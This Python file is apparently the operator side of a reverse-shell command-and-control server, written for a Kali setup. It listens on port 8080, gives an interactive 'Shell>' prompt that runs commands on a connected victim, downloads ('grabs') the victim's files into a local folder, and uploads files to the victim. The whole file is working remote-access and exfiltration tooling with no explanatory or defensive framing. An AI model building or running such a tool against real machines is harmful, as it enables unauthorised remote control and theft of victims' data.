import os
import socket


def doGrab(conn, command, operation):
    conn.send(command.encode())
    if (operation == "grab"):
        grab, sourcePathAsFileName = command.split("*")
        path = "/home/kali/Desktop/GrabbedFiles/"
        fileName = "grabbed_" + sourcePathAsFileName

        f = open(path + fileName, 'wb')
        while True:
            bits = conn.recv(5000)
            if bits.endswith('DONE'.encode()):
                f.write(bits[:-4])
                f.close()
                print('[+] Transfer completed')
                break
            if 'File not found'.encode() in bits:
                print('[-] Unable to find file')
                break
            f.write(bits)
        print("File name: " + fileName)
        print("Written to: " + path)


def doSend(conn, sourcePath, destinationPath, fileName):
    if os.path.exists(sourcePath + fileName):
        sourceFile = open(sourcePath + fileName, 'rb')
        packet = sourceFile.read(5000)
        while len(packet) > 0:
            conn.send(packet)
            packet = sourceFile.read(5000)
        conn.send('DONE'.encode())
        print('[+] Transfer Completed')
    else:
        conn.send('File not found'.encode())
        print('[-] Unable to find file')
        return


def connect():
    s = socket.socket()
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(('10.0.0.128', 8080))
    s.listen(1)
    print("=" * 60)
    print("TCP DATA INFILTRATION AND EXFILTRATION")
    print("=" * 60)
    print('[+] Listening for incoming TCP connections on port 8080')
    conn, addr = s.accept()
    print('[+] Connection established with', addr)

    while True:
        print("=" * 60)
        command = input("Shell> :")
        if "terminate" in command:
            conn.send("terminate".encode())
            break

        elif 'grab' in command:
            doGrab(conn, command, "grab")

        elif 'send' in command:
            sendCmd, destination, fileName = command.split("*")
            source = input("Source path: ")
            conn.send(command.encode())
            doSend(conn, source, destination, fileName)

        else:
            conn.send(command.encode())
            print(conn.recv(5000).decode())


def main():
    connect()


main()
